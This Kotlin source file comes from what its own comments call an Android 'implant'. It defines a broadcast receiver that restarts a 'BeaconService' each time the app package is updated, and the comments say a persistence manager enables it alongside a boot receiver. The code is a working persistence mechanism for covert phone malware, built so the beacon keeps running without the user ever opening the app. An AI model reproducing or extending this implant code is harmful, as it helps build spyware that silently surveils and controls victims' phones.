package io.umbra.beacon

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

/**
 * Starts the beacon when the implant itself is updated.
 *
 * An update of the application replaces the code of the implant: without a
 * receiver the phone would keep the new code but not run it until somebody
 * opened the app.  The receiver is declared in the manifest and enabled by
 * the persistence manager, exactly like the boot receiver.
 */
class UpdateReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Intent.ACTION_MY_PACKAGE_REPLACED) return
        BeaconService.start(context)
    }
}
